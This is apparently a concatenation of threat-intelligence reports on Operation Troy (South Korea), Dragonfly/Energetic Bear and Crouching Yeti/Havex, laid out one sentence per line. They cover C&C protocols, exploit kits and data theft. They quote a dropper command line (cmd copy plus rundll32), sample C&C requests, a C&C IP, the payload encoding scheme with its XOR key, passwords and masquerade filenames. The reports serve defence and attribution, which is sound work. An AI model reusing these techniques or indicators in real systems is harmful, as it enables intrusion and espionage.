The Work directory , with path shown below , is also used with Troy variants Concealment Troy and 3Rat Client , which were both compiled in 2013 .
We also found a file - mapping function in this variant similar to those in most of the newer versions .
The unique string beginning with `` FFFFFFF '' is identical and occurs throughout the later variants .
The malware establishes an IRC channel to receive real - time commands in the same manner as the military espionage malware .
Another variant from 2010 , EagleXP , is closely related to NSTAR and HTTP Troy based on reused components .
A variant compiled May 27 , 2010 , also contained a very similar compile path .
We were able to obtain some traffic from the control server .
The May 27 variant , called Chang , operated in the same manner as other Troy variants and used the same bs.dll .
A Korean manufacturing website hosted both the control server and an IRC server .
Both the Chang and EagleXP variants are based on the same code that created NSTAR and later Troy variants .
These similarities confirm the attackers have operated for more than three years against South Korean targets .
During our investigation we dug into the attackers ' controlling botnet , which was used until 2013 .
The infrastructure relied upon on a network of hacked South Korean websites hosting IRC servers .
The infected clients in turn communicated with the IRC servers using RSA encryption and used functions imported from the Microsoft Cryptography API library .
The attackers hardcoded the control domains in bs.dll and distributed it in the final compiled Trojan code .
Each variant of each generation of Trojans contained different hardcoded strings pertaining to the control servers .
This shows that the attackers first compromised the future IRC server sites and then compiled the component and distributed it to infected targets .
The nickname for the bot can be determined by the outbound traffic and information written to the Windows registry .
One variant operating in June 2010 used the nickname BS^000C2918AB11 with the password wodehaopeng .
The malware joined the IRC channel # god and sent several private messages to what was likely the control server to receive instructions .
In 2011 the attackers created the Trojan HTTP Troy , named from its compile path string ; this was the first of the Troy family of Trojans .
To date we have found only one sample of HTTP Troy .
Upon execution the malware launches a crippled GUI that allows the victim to install a screen saver displaying politically sensitive images .
We do n't know why the developers took the risk of making the Trojan visible .
The screensaver component ( chonanship.scr ) is not malicious and was compiled on December 12 , 2010 .
It contained images related to the sinking of the South Korean Navy ship Cheonan .
As we can see , HTTP Troy uses the same DLL as the NSTAR , Chang , and EagleXP variants did in 2010 .
This path was contained in a dropped DLL component that was used to establish a hidden IRC channel to the attackers ' control server .
The primary dropper file for this remote - access Trojan was disguised as AhnLab 's Smart Update Utility setup program .
The original filename was SUpdate.exe .
After executing , the remote - access Trojan makes a connection to sujewha.com , the IRC control server .
We found a second - generation Trojan based on HTTP Troy that included the compile path Z : \1Mission\Team_Project\ [ 2012.6~ ] \HTTP Troy\HttpDr0pper\Win32\Release .
This Trojan , Http Dr0pper , was compiled in 2012 from the HTTP Troy directory , indicating it is an advancement of the original HTTP Troy .
All of the variants from this point reuse a specific DLL , which in some instances is named HTTPSecurityProvider.dll and uses the Microsoft Cryptography API to secure communications .
We can track the reuse of this DLL based on the consistent file‑mapping function that appears throughout the variants .
We can determine that another variant , Tong ( based on the directory in which it was compiled ) , also reuses this DLL and contains the same function .
Furthermore , variants such as Concealment Troy that were compiled in 2013 contain the same function once decoded .
Still , some of the base code is reused in the supporting DLL for Concealment Troy .
After execution the Trojan makes a connection to the control server using specific parameters that include the IRC nickname .
This communication pattern is consistent with other variants that reference Troy .
The Tong variant contains the compile path E : \Tong\Work\Op\1Mission\Team_Project\ [ 2012.6~ ] \HTTP Trojan 2.0\HttpDr0pper\Win32\Release .
It also communicated using the same methods .
This Trojan was compiled on August 28 , 2012 .
Previous versions used bs.dll , which contained the code for communicating with the IRC botnet .
The evasion routines check for the presence of debuggers and tracers that attach to the parent process .
This effectively causes the parent process to immediately terminate when under analysis by emulation or sandboxing systems that attempt to hook and monitor API calls coming from that process .
Furthermore , TDrop uses a DLL to run under nonprivileged accounts on Windows 7 .
This variant was compiled on January 15 , 2013 , and contained the compile path D : \Work\Op\Mission\TeamProject\ [ 2012.11~12 ] \TDrop\Dropper32\Release\Dropper.pdb .
The main executable , which extracts the other components , was compiled from the path Z : \Work\v3zip\misc.c and Z : \Work\v3unzip.c .
This is likely a compression tool to extract the files to the desktop .
Just as Http Dr0pper , TDrop uses the disguised dropper component AhnlabUpdate.exe .
The unique code is nearly identical to that used in Http Dr0pper with the exception of the last two characters .
When the main Trojan file executes , it launches RunCmd.exe , which itself does n't appear to be malicious .
These files are created in the directory 114719_507_AhnlabUpdateKit , which sits in a temp directory created on the desktop .
It is obvious that the attackers were aware of the security product that the target environment used and attempted to make the malware appear as legitimate as possible .
Another third - generation Troy family Trojan is Concealment Troy .
This version was compiled from the same directory as the 3Rat client found in the victims ' environments on March 20 .
Some components from Concealment Troy suggest that the source code was originally written in 2010 and was later compiled for use in this campaign .
The 64-bit component to install the backdoor on the victims ' systems contains an interesting compile path and was first created on November 28 , 2012 .
The 32-bit version was compiled January 23 , 2013 , and contained this compile path : Concealment Troy does not employ real - time IRC control as earlier versions did .
Our analysis shows this network is connected to the Dark Seoul incident .
Furthermore , we have also determined that a single group has been behind a series of threats targeting South Korea since October 2009 .
In this case the adversary had designed a sophisticated encrypted network designed to gather intelligence on military networks .
We have confirmed cases of Trojans operating through these networks in 2009 , 2010 , 2011 , and 2013 .
This network was designed to camouflage all communications between the infected systems and the control servers via the Microsoft Cryptography API using RSA 128-bit encryption .
Everything extracted from these military networks would be transmitted over this encrypted network once the malware identified interesting information .
What makes this case particularly interesting is the use of automated reconnaissance tools to identify what specific military information internal systems contained before the attackers tried to grab any of the files .
The attacks would have occurred in four general stages : • Initial compromise via a `` watering - hole attack , '' which would lead to the exploitation of the internal systems ( in the 2009 case ) .
Malware can also scrape out passwords and registry information along with directory listing of interesting files .
Can selectively grab specific files as needed .
The attacker 's encrypted network uses Microsoft 's Cryptography API library Version 1.0 to encrypt communication channels to the control servers over both HTTP and IRC .
The encryption uses a 128-bit RSA key , shown as imported and used by the following code .
This network operates over both HTTP and uses IRC as secondary channel for real - time operations .
The IRC network is based on the open - source library libircclient and everything sent over this IRC channel is encrypted via the Cryptography API .
The following commands are supported by IRC to control infected systems in real time .
This functionality enables the attacker to send and receive files on demand and execute remote commands .
The messages sent between client and servers are base64 encoded and then encrypted using the Cryptography API ; thus a message must be decoded and decrypted to be visible .
This highly sophisticated method provides for great flexibility over a secure encrypted channel that is not SSL .
The encrypted network operates by scanning infected systems and categorizing those systems that contain interesting documents .
The malware does not extract every document that is found as a match through drive scanning ; rather it assigns a unique signature to the infected system according to what it contains .
Less interesting systems are less likely to have documents extracted from them .
The directory contents are uploaded to the attacker 's server , which lets the attacker grab documents at will and keeps the amount of network traffic low .
The theft of classified information is the primary purpose of this network and would occur through drive scanning .
Drive scanning locates classified information on target systems and gives the attacker an overall idea of what these military networks have .
The malware searches the root disk , counts the number of interesting files , and determines the level of that system 's importance to the attacker .
The search criteria are primarily specific file extensions and keywords in document titles .
The keywords are all military specific .
Some refer to specific military units and programs that operate in South Korea .
This function would determine only the number of interesting files that are contained on any given system ; another function would extract the list of files that match these search criteria .
In addition to searching for English keywords , the function searches for Korean ASCII characters that represent a subset of military terms .
Most keywords specific to military operations in South Korea are in English .
There is also a set of abbreviations .
The files to be sent to the attacker 's server are zipped using the open - source Zip Utils .
The component uses the password `` dkwero38oerA^t @ # .
It is used primarily to archive items to be stolen from infected systems .
In all of these threats we have seen the consistent use of bs.dll , a stripped down version of ip6ld.dll , which we have found in the military espionage cases .
We can connect not only similar functions within bs.dll from 2011 to date with those of the military cases in 2009 and 2010 , but also the shared encryption key for zipping classified information to be sent to the control server .
This ip6ld.dll is the same as another file , ~81923.dll ; both operate in the same manner .
The component bs.dll has been seen in a number of Troy - era malware samples : Chang , EagleXP , NSTAR , Mail Attack , HTTP Troy , Tong , Http Dr0pper , etc .
The file Ip6ld.dll , which contains much of the logic described in these attacks , shares a number of common functions with bs.dll , including the zip encryption password .
In addition , the IRC and encryption functions are the same in both files , indicating they were built by the same individual or group .
The two functions are likely the same source code in different versions .
The primary difference between them is bs.dll 's lack of searching for specific extensions and terms that Ip6ld.dll and ~81923.dll contain .
This suggests bs.dll requires a second module and we have seen that with the Mail Attack variant , compiled in February 2011 , which contained both bs.dll and payload.dll , with the latter containing the military - specific search and extraction functions .
The following function found in bs.dll lists the contents of specified directories and zips those contents into an archive file with a password .
This function does n't have any criteria and is likely disabled in some cases , such as with HTTP Troy , which downloads a payload module to search for data .
A separate action puts the directory contents into a separate file and prepares it to be sent to the remote server .
We have determined that some variants of Http Dr0pper will execute payload32.dll , which is essentially the same DLL that is found in TDrop .
This component contains military keywords .
One variant of Http Dr0pper made use of payload32.dll , which was compiled on August 23 , 2012 .
The TDrop version was compiled January 13 , 2013 .
This consistency confirms further that the operations against South Korea are primarily focused on military intelligence gathering and have attempted to break in since 2009 .
The espionage malware has the capability to destroy systems in the same way that the March 20 , 2013 , attacks disabled thousands of systems in South Korea .
This capability could be devastating if military networks were to suddenly be wiped after an adversary had gathered intelligence .
This was clearly the case with the March 20 Dark Seoul incident , in which we confirmed that the 3Rat Trojan gained access prior to the MBR - wiping event .
There was at least one limitation , however : We found the malware of February 2011 could wipe its targets only if it detected that it was being debugged or analyzed by a security product .
Through our research we have discovered a number of distinct subcampaigns as part of the overall Operation Troy , which has targeted military forces in South Korea to extract classified information .
These operations were designed to occur in 2009 through 2013 .
Recently we uncovered evidence to suggest that they continued just prior to Dark Seoul .
We can link the actor ( s ) responsible for Dark Seoul to these particular espionage campaigns through various technical means .
The Troy - era malware is based on the same source code used to create these specialized variants and shares many commonalities , such as bs.dll and payload.dll , which are found consistently throughout the families .
The attackers have attempted since 2009 to install the capability to destroy their targets using an MBR wiper component , as seen in the Dark Seoul incident .
From our analysis we have established that Operation Troy had a focus from the beginning to gather intelligence on South Korean military targets .
We have also linked other high - profile public campaigns conducted over the years against South Korea to Operation Troy , suggesting that a single group is responsible .
A cyberespionage campaign against a range of targets , mainly in the energy sector , gave attackers the ability to mount sabotage operations against their victims .
The attackers , known to Symantec as Dragonfly , managed to compromise a number of strategically important organizations for spying purposes and , if they had used the sabotage capabilities open to them , could have caused damage or disruption to the energy supply in the affected countries .
The Dragonfly group , which is also known by other vendors as Energetic Bear , are a capable group who are evolving over time and targeting primarily the energy sector and related industries .
They have been in operation since at least 2011 but may have been active even longer than that .
Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013 .
More recent targets have included companies related to industrial control systems .
Dragonfly has used spam email campaigns and watering hole attacks to infect targeted organizations .
The group has used two main malware tools : Trojan . Karagany and Backdoor . Oldrea .
The latter appears to be a custom piece of malware , either written by or for the attackers .
Symantec observed spear phishing attempts in the form of emails with PDF attachments from February 2013 to June 2013 .
The email topics were related to office administration issues such as dealing with an account or problems with a delivery .
Identified targets of this campaign were mainly US and UK organizations within the energy sector .
In May 2013 , the attackers began to use the Lightsout exploit kit as an attack vector , redirecting targets from various websites .
The use of the Lightsout exploit kit has continued to date , albeit intermittently .
The exploit kit has been upgraded over time with obfuscation techniques .
The updated version of Lightsout became known as the Hello exploit kit .
A newer approach used by the attackers involves compromising the update site for several industrial control system ( ICS ) software producers .
They then bundle Backdoor . Oldrea with a legitimate update of the affected software .
To date , three ICS software producers are known to have been compromised .
The Dragonfly attackers used hacked websites to host command - and - control ( C & C ) software .
Compromised websites appear to consistently use some form of content management system .
The current targets of the Dragonfly group , based on compromised websites and hijacked software updates , are the energy sector and industrial control systems , particularly those based in Europe .
While the majority of victims are located in the US , these appear to mostly be collateral damage .
That is , many of these computers were likely infected either through watering hole attacks or update hijacks and are of no interest to the attacker .
By examining victims with active infections – where additional malicious activity has been detected – it is possible to gather a more accurate picture of ' true ' victims .
The most active infections , as in Figure 2 , are in Spain , followed in order by the US , France , Italy , and Germany .
Dragonfly uses two main pieces of malware in its attacks .
Both are Remote Access Tool ( RAT ) type malware which provide the attackers with access and control of compromised computers .
Dragonfly 's favored malware tool is Backdoor . Oldrea , which is also known as Havex or the Energetic Bear RAT .
Oldrea acts as a back door for the attackers on to the victim 's computer , allowing them to extract data and install further malware .
Oldrea appears to be custom malware , either written by the group itself or created for it .
This provides some indication of the capabilities and resources behind the Dragonfly group .
The second main tool used by Dragonfly is Trojan . Karagany .
Unlike Oldrea , Karagany was available on the underground market .
The source code for version 1 of Karagany was leaked in 2010 .
Symantec believes that Dragonfly may have taken this source code and modified for its own use .
Symantec found that the majority of computers compromised by the attackers were infected with Oldrea .
Karagany was only used in around 5 percent of infections .
The two pieces of malware are similar in functionality and what prompts the attackers to choose one tool over another remains unknown .
The Dragonfly group has used at least three infection tactics against targets in the energy sector .
The earliest method was an email spear phishing campaign , which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment .
Infected emails had one of two subject lines : `` The account '' or `` Settlement of delivery problem '' .
All of the emails were from a single Gmail address .
Figure 3 displays the number of different recipients per day .
The spam campaign began in February 2013 and continued into June 2013 .
Symantec identified seven different organizations targeted in this campaign .
At least one organization was attacked intermittently for a period of 84 days .
In June 2013 , the attackers shifted their focus to watering hole attacks .
They compromised a number of energy- related websites and injected an iframe into each of them .
This iframe then redirected visitors to another compromised legitimate website hosting the Lightsout exploit kit .
This in turn exploited either Java or Internet Explorer in order to drop Oldrea or Karagany on the victim 's computer .
The fact that the attackers compromised multiple legitimate websites for each stage of the operation is further evidence that the group has strong technical capabilities .
In September 2013 , Dragonfly began using a new version of this exploit kit , known as the Hello exploit kit .
The landing page for this kit contains JavaScript which fingerprints the system , identifying installed browser plugins .
The victim is then redirected to a URL which in turn determines the best exploit to use based on the information collected .
Figure 4 shows the compromised websites categorized into their respective industries .
Fifty percent of identified targets were energy industry related and thirty percent were energy control systems , as shown in Figure 4 .
A clear shift in the attackers targeting can be seen in March 2014 when energy control systems become the primary target .
The most ambitious attack vector used by Dragonfly was the compromise of a number of legitimate software packages .
Three different ICS equipment providers were targeted and malware was inserted into the software bundles they had made available for download on their websites .
Analysis of the compilation timestamps on the malware used by the attackers indicate that the group mostly worked between Monday and Friday , with activity mainly concentrated in a nine - hour period that corresponded to a 9 am to 6 pm working day in the UTC + 4 time zone .
The Dragonfly group is technically adept and able to think strategically .
Given the size of some of its targets , the group found a `` soft underbelly '' by compromising their suppliers , which are invariably smaller , less protected companies .
Identification of this group is based on the use of two malware families and an exploit kit .
The malware families utilized are Backdoor . Oldrea and Trojan . Karagany .
The exploit kit is known as Lightsout and/or Hello .
Hello is an updated iteration of Lightsout that the Dragonfly group began to use in September 2013 .
Use of Backdoor . Oldrea appears to be limited to the Dragonfly group .
In addition , specific instances of Trojan .
Karagany have been used by this group .
Karagany is a Russian RAT sold on underground forums .
Instances of this malware related to the Dragonfly group are identified based on them being delivered through the Lightsout exploit kit and also a particular packer that this group used .
Symantec detects the Trojan . Karagany packer used by this group as Trojan . Karagany ! gen1 .
The Lightsout exploit kit is a simple exploit kit that is consistently used to deliver primarily Backdoor . Oldrea and , in several instances , Trojan . Karagany .
A number of sites that use content management systems were exploited and an iframe was used in order to redirect visitors to sites hosting the Lightsout exploit kit .
An example of an injected iframe can be seen in figure 7 .
The exploit kit uses browser ( e.g .
Internet Explorer and Firefox ) and Java exploits in order to deliver either Backdoor . Oldrea or Trojan . Karagany .
An example of the structure of the Lightsout exploit kit can be seen Table 1 .
Note that file names and exploits used may vary .
In September 2013 , the Dragonfly group began using a new version of Lightsout , also known as the Hello exploit kit .
The JavaScript included in the landing page redirects the browser to a URL that depends on the fonts installed on the system , browser add - ons , the OS version , and the user agent .
At this point , it determines the best exploit to use , based on the information provided , and generates an appropriate URL to redirect the user to the appropriate exploit / payload .
The following shows an example of such a request : [ EK_DETERMINED_PARAMETER ] may be anything listed in Table 2 .
The parameters dwe and dwd relate to which payload is requested for download , for example : • When a Backdoor . Oldrea payload is requested [ EK_DETERMINED_PARAMETER ] is dwd • When a Karagany ! gen1 payload is requested [ EK_DETERMINED_PARAMETER ] is dwe The values of the [ EK_DETERMINED_PARAMETER ] variable may relate to the two different file types represented by Backdoor . Oldrea and Trojan .
Karagany ! gen1 payloads .
Oldrea payloads are DLL files ( URLs end in `` d '' for DLL ? ) while Karagany ! gen1 payloads are portable executables ( URLs end in `` e '' for EXE ? ) .
At the core of Backdoor . Oldrea is a persistent component that interacts with C & C servers to download and execute payloads .
The components are downloaded by reaching out to the C & C server and performing a GET request which returns an HTML page containing a base64 encoded string between two comments marked with the ' havex ' string .
Post infection , Backdoor . Oldrea will attempt to collect system information such as OS , user name , computer name , country , language , nation , Internet adapter configuration information , available drives , default browser , running processes , desktop file list , My Documents , Internet history , program files , and root of available drives .
It also collects data from Outlook ( address book ) and ICS related software configuration files .
This data is collected and written to a temporary file in an encrypted form before it is POST'ed to a remote C & C server .
The following are examples of a POST request and a POST response : POST request example : POST /wp08/wp - includes / dtcla.php ? id=285745296322896178920098FD80 - 20 & v1=038 & v2=17 0393861 & q=5265882854508EFCF958F979E4 HTTP/1.1 User - Agent : Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en - US ) AppleWebKit/525.19 ( KHTML , like Gecko ) Chrome/1.0.154.36 Safari/525.19 Host : toons.freesexycomics.com Content - Length : 0 Cache - Control : no - cache POST response example : HTTP/1.1 200 OK Date : We d , 22 Jan 2014 13:40:48 GMT Content - Type : text / html Transfer - Encoding : chunked Connection : keep - alive Server : Apache/1.3.37 ( Unix ) Cache - Control : no - cache 9f65 < html > < head > < mega http - equiv='CACHE - CONTROL ' content='NO - CACHE ' > < / head > < body > No data ! < ! -- havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// /////////4oB+93VVXu69DuN7XYzds9yt49Ques [ ...
In one example , the sample searches for the data enclosed by the tag ' havex ' .
Once the data is found , it is decoded using standard base64 + bzip2 and also a xor layer with bytes from the string 1312312 .
The decoded data contains a small header followed by an executable MZ - file .
Another sample was found to use standard base64 + reverse xor + RSA-2048 for decrypting received data .
The decrypted data consists of a 6 byte command concatenated with an MZ file .
The MZ file is compressed with the lzma algorithm .
This section includes information about identified payloads downloaded by Backdoor . Oldrea .
The following is a brief description of the functionality for each identified component : • Tmpprovider is a persistent component that interacts with the C & C server ( downloads and executes payloads ) .
The sample analyzed carried a Web browser password recovery tool originating from http : //securityxploded.com / browser - password - decryptor.php • The RunExeCmdSingle component is a DLL file that drops and executes another executable .
The export ' runDll ' of this file is where the logic is implemented .
The two samples look for the ICS related software file and Outlook 's autocomplete address book file ( outlook.nk2 ) .
Trojan . Karagany is a back door used primarily for recon .
It is designed to download and install additional files and exfiltrate data .
Samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer / protector for the payload .
Where present in samples , the Delphi packer is configured to use ' neosphere ' as a key to decrypt the payload .
The following is a brief overview of the functionality of Trojan . Karagany : • Can upload , download , and execute files on the system • Has plugin capability ( may load several plugins for added functionality , such as Web injects ) • Payload is approximately 72Kb in size and is programmed in C / C++ • Contains a small embedded DLL file , which monitors WSASend and send APIs for capturing ' Basic Authentication ' credentials Trojan . Karagany creates a folder in the user APPDATA directory and chooses the directory name from the following list : • Microsoft WCF services • Broker services • Flash Utilities • Media Center Programs • Policy Definitions • Microsoft Web Tools • Reference Assemblies • Analysis Services • InstallShield Information • IIS SQL Server • Diagnostics • NTAPI Performance • WPF Platform It copies itself in the created directory with hidden and system attributes using a file name chosen from the following list : • SearchIndexer.exe • ImeBroker.exe • fsutil.exe • PnPutil.exe • BdeUISrv.exe • WinSAT.exe • pwNative.exe • SnippingTool.exe • DFDWizard.exe • PrintBrmEngine.exe • WbemMonitor.exe • dxpserver.exe • PowerMng.exe Trojan . Karagany copies itself with hidden and system attributes where it was first executed as err.log [ DIGITS ] .
It then copies the legitimate chkdsk utility in the installation folder using the payload file name but with a space before the file extension .
This may fool ordinary users into thinking that this folder contains a legitimate application , for example PnPutil .exe
Trojan . Karagany ! gen1 may create the following additional files in the installation folder : • Form.api • inact.api • prog.cer • Cent.api • ie.pdb It then creates a C : \ProgramData\Mail\MailAg\gl directory as a temporary directory used for uploading files .
Trojan . Karagany then creates a link to itself in the Startup folder as an autostart when the system restarts .
Trojan . Karagany first checks for a live Internet connection by visiting Microsoft or Adobe websites .
It will only reach out to its C & C server once this check is successful .
Example HTTP Requests Internet connection test to Microsoft GET /en - us / default.aspx HTTP/1.1 Accept - Encoding : gzip , deflate Content - Type : application / x - www - form - urlencoded Host : microsoft.com Cookie : MC1=V=3 & GUID= < 32 character guid > Connection : Keep - Alive Cache - control : no - cache Internet connection test to Adobe using identifiant parameter POST /geo / productid.php HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : adobe.com ...
The following two examples have been observed : • Mozilla/17.0 ( compatible ; MSIE 8.0 ; Windows NT 6.1 ; .NET
Needs ' vaultcli.dll ' library • fl.txt - Used for listing RTF , PST , DOC , XLS , PDF , * pass * .
Our innovative products and services protect people and information in any environment - from the smallest mobile device to the enterprise data center to cloud - based systems .
Our industry - leading expertise in protecting data , identities , and interactions gives our customers confidence in a connected world .
More information is available at www.symantec.com or by connecting with Symantec at go.symantec.com/socialmedia .
Headquartered in Mountain View , Calif. , Symantec has operations in 40 countries .
More information is available at www.symantec.com .
For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters 350 Ellis St. Mountain View , CA 94043 USA + 1 ( 650 ) 527 - 8000 1 ( 800 ) 721 - 3934 www.symantec.com Copyright © 2014 Symantec Corporation .
All rights reserved .
Symantec , the Symantec Logo , and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries .
Other names may be trademarks of their respective owners .
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation .
The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use .
Any use of the technical documentation or the information contained herein is at the risk of the user .
Documentation may include technical or other inaccuracies or typographical errors .
Symantec reserves the right to make changes without prior notice .
Energetic Bear / Crouching Yeti is an actor involved in several advanced persistent threat ( APT ) campaigns that have been active going back to at least the end of 2010 .
Targeted sectors include : • Industrial / machinery • Manufacturing • Pharmaceutical • Construction • Education • Information technology Most of the victims we identified fall into the industrial / machinery building sector , indicating this is of special interest .
To infect the victims , the attackers rely on three methods : • Spearphishing using PDF documents embedded with a flash exploit ( CVE-2011 - 0611 ) • Trojanized software installers • Waterhole attacks using a variety of re - used exploits During the attacks , the Crouching Yeti uses several malware / Trojans , which exclusively infect Windows systems : • Havex Trojan • Sysmain Trojan • The ClientX backdoor • Karagany backdoor and related stealers • Lateral movement and second stage tools For command and control , these connect to a large network of hacked websites .
These sites host malware modules , victim information and issue commands to infected systems .
The dozens of known Yeti exploit sites and their referrer sites were legitimate , compromised sites .
They ran vulnerable content management systems or vulnerable web applications .
None of the exploits used to compromise the servers were known to be zero - day .
None of the client side exploits re - used from the open source metasploit framework were zero - day .
Overall , we observed about 2,800 victims worldwide , the most prevalent attack tool being the Havex Trojan .
We believe this group is highly determined and focused on a very specific industrial sector of vital interest .
It uses a variety of ways to infect its victims and exfiltrate strategic information .
The analyzed data seems to suggest the following points : ● It is not currently possible to determine the Country of origin The attackers ' global focus is much broader than power producers ● Their toolset has remained stable over time ● Managed , minimal , methodical approach to sustained operation ● Appropriate use of encryption ( symmetric key protected with attackers public key for encrypted log file exfiltration ) This report provides technical details on how they perform their operations .
This section analyzes all the aspects we could find about how this actor performs its campaigns .
The Crouching Yeti actor performed a massive surveillance operation targeting strategic victims , many of them in the industrial / manufacturing sector .
There were different ways of delivering of its malware including waterholing , spearphishing and adding malware to legitimate installers .
Once the victims were infected , Crouching Yeti selected different RATs for its operations .
These RATs communicated with Command and Control servers on compromised servers around the world , using a simple PHP backend .
We were able to identify several victims , including high - profile ones and dozens of domains used in the campaign .
As far as we know the group behind Crouching Yeti delivers its malware using at least three different methods .
The first method uses a legitimate software installer repackaged to contain the malicious DLL .
Such modified self - extracting archives could have been uploaded directly to a compromised server , replacing the original file , or sent to the victim by email .
One example of this method was a hijacked SwissRanger camera driver ( libMesaSR version 1.0.14.706 ) that was used to drop the Sysmain backdoor to : % APPDATA % \sydmain.dll and set the Run registry value to load malicious DLL upon next system startup .
In a similar manner , as early as January 2014 , Havex version 038 appears to have been dropped by a legitimate ~40 MB software installer from the eWon web site : hxxp : //www.ewon.biz / software / eCatcher / eCatcherSetup.exe '' eWon '' is a Belgian producer of SCADA and industrial network equipment , which helps define this attack method as a watering hole attack : '' Breaking the barrier between industrial applications and IT standards , the mission of eWON is to connect industrial machines securely to the Internet , enabling easy remote access and gathering all types of technical data originating from industrial machines ...
Connecting machines across the Internet is our mission .
Likely , the attackers gained access to eWon 's ftp site and replaced the legitimate file with one that is bound with the Havex dropper several times .
Another example that involves a hijacked application from a PLC - related vendor is a Trojanized mbCHECK installer which replaced the original legitimate version freely downloadable from the vendor 's website .
The legitimate version can be downloaded for free from the vendor 's website .
The vendor - MB Connect Line - is a company which specializes in software for remote maintenance of PLC systems : MB Connect Line GmbH ( hxxp : //www.mbconnectline.com / index.php / en/ ) .
In this case , the dropped DLL was Havex version 043 .
The second method relies on a malicious XDP file containing the PDF / SWF exploit ( CVE-2011- 0611 ) and was most probably used in spear - phishing attacks .
This exploit drops the Havex loader DLL , which is stored in an encrypted form in the XDP file .
The exploit is delivered as an XDP file ( XML Data Package ) which is actually a PDF file packaged within an XML container .
This is a known the PDF obfuscation method and serves as an additional anti - detection layer .
The XDP file contains an SWF exploit and two files ( encrypted with XOR ) stored in the invalid section of the PDF .
One of the files is Havex DLL ( version 038 ) , the other is a small JAR file which is used to copy and run the DLL by executing the following command : cmd /c copy < fname_passed_as_param > % TEMP % \\explore.dll /y & rundll32.exe % TEMP % \\explore.dll , RunDllEntry SWF executes the action script , which contains another SWF file which in turn uses the CVE- 2011 - 0611 vulnerability to run the shellcode .
The shellcode then looks for a specific signature in the memory ( which signs the start of encrypted DLL ) , decrypts and loads it .
Finally , this actor actively compromises legitimate websites for watering hole attacks .
These hacked websites in turn redirect to malicious JAR or html files hosted on other sites maintained by the group ( exploiting CVE-2013 - 2465 , CVE-2013 - 1347 , and CVE-2012 - 1723 in Java 6 , Java 7 , IE 7 and IE 8 ) , which then drop the Havex loader , the Karagany backdoor and helper tools .
These sites run an exploit kit known as `` LightsOut '' .
It appears that the `` LightsOut '' exploit kit is exclusively used by Energetic Bear / Crouching Yeti .
From the dozens of Yeti exploit sites we reviewed , the malicious code was nothing more than slightly modified metasploit java exploits delivering the Havex loader .
Some sort of internal review must have pushed them towards the LightsOut EK .
In earlier cases ( July 2013 ) , successful Java exploitation served from nahoonservices.com would cascade into more Yeti components planted on victim systems .
The java exploit downloaded Karagany backdoors , which in turn downloaded stealers from 91.203.6.71 : Ksn data recorded at least 20 victim sites that were compromised and injected with Yeti iframes , redirecting hundreds of visitors to compromised Yeti exploit sites .
Most of these redirector sites were owned by western and Eastern European power players , investors , legal advisors and advocates , and European and US industrial IT equipment makers .
The compromised sites hosting the LightsOut Exploit Kit were fairly trafficked , legitimate sites .
Their content varies widely , from California winemakers to Cuban travel agencies and Iranian general interest / religious inspiration sites .
Finally , other second stage tools were simply retrieved by the downloaders over http from various servers .
Some of these Yeti sites , like kinoporno.org , served both Havex and these tools .
The Crouching Yeti group has different tools of choice for their operations .
This section describes them from a technical perspective .
The main functionality of this component is to download and load additional DLL modules into the memory .
These are stored on compromised websites that act as C & C servers .
In order to do that , the malware injects itself into the EXPLORER.EXE process , sends a GET / POST request to the PHP script on the compromised website , then reads the HTML document returned by the script , looking for a base64 encrypted data between the two `` havex '' strings in the comment tag < ! -- havexhavex -- > and writes this data it to a % TEMP % \ < tmp > .xmd
In the meantime , another routine is constantly checking the % TEMP % folder for all * .xmd files .
For each file it finds , it decompresses the content , decrypts ( if encrypted ) and loads into the memory as the DLL .
In order to run on each system boot , malware copies itself to : < path > \TMPprovider0XX.dll and creates the autorun registry key .
All samples of this component contain a statically linked bzip2 library .
Versions > = 01B also contain an RSAeuro library , used to encrypt log files and decrypt downloadable modules .
Public keys for encryption are hardcoded in the binary and/or stored in the configuration section .
In some cases , these keys are written to the registry values .
In total , we identified 124 different samples of Havex loaders , belonging to 27 different versions .
As of June 2014 , the latest version number we have is 044 .
The URL addresses of the C & C servers ( which are indeed compromised websites ) are either hardcoded in the binary , or - in versions = > 038 - specified in the configuration section inside the ICT resource .
This resource is compressed with bzip2 and encrypted with XOR .
There are usually 2 - 4 URLs per binary , different for each malware version and sometimes also different between samples of the same version .
Malware sends a GET request ( versions < 017 ) or POST request to the first available URL .
The request contents depends on the malware version and it may include such information as unique bot i d , malware version number , OS version number , and some other data from configuration , as well as the harvested information logged into the * .yls file ( if any ) .
Then the malware searches the HTML code of each returned page for havex markers and saves the data between the markers into a temporary file .
These modules are hosted between the havex markers in the HTML code of compromised websites .
The module code is usually XORed with `` 1312312 '' then compressed with BZIP2 and finally base64 encoded .
Once downloaded into the % TEMP % \*.xmd file by the main Havex DLL , the code is decoded , decompressed , saved into the temporary DLL file and loaded into the memory .
The modules perform a variety of different actions , including collecting information about the victim 's system and other machines in the local network , harvesting passwords , listing documents , etc .
In order to do that , some of the modules make use of additional 3rd stage 3rd party executables .
Each module contains configuration information stored in an encrypted and compressed form inside a resource .
Configuration data includes 29-byte UID ( unique ID ) , a 1024-bit RSA Public key ( base64 encoded ) and other necessary info ( like file paths , etc . ) .
All harvested data is compressed , encrypted and written into the % TEMP % \*.yls files , which are then sent to the C & C by the main Havex / Sysmain module .
The `` yls '' files are encrypted with the 3DES crypto algorithm using a random 192-bit key ( 168 bit effective ) .
The 3DES key is encrypted using the public RSA 1024 key and therefore never transferred in plain text to attackers .
In - depth analysis of the cryptography used by log files is presented in Appendix 2 This module is designed to collect detailed data about the OPC servers running in the local network and save them to a % TEMP % \ { rand } .yls
To query the OPC servers , it uses the following interfaces : ● IID_IOPCEnumGUID ● IID_IOPCServerList ● IID_IOPCServerList2 ● IID_IOPCServer ● IID_IOPCBrowsr ● IID_IOPCBrowseServerAddressSpace ● IID_IOPCItemProperties ● CATID_OPCDAServer10 ● CATID_OPCDAServer20 ● CATID_OPCDAServer30 This module collects basic information about the system it 's running on , and saves it to the % TEMP % \ { rand } .yls
